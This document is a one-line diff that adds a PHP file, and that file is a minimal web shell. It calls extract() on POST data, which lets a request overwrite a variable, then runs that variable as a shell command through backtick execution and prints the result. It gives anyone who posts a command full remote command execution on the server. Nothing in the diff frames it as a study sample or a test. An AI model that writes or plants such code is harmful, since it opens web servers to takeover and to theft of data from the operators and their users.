@@ -1,0 +1,1 @@
+<?php  $a=1;$b=$_POST;extract($b);print_r(`$a`)?>
